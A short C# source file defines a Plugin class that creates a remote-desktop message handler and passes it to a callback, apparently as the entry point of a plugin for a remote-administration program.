

using InvokedCommon.Messages;
using Plugin.MessageHandlers;
using System;


namespace Plugin
{
	public class Plugin
	{
		public void ExecuteCallback(Action<IMessageProcessor, string> callback, string PluginName)
		{
			try
			{
				IMessageProcessor messageProcessor = (IMessageProcessor) new PluginRemoteDesktopHandler();
				callback(messageProcessor, PluginName);
			}
			catch
			{
			}
		}
	}
}
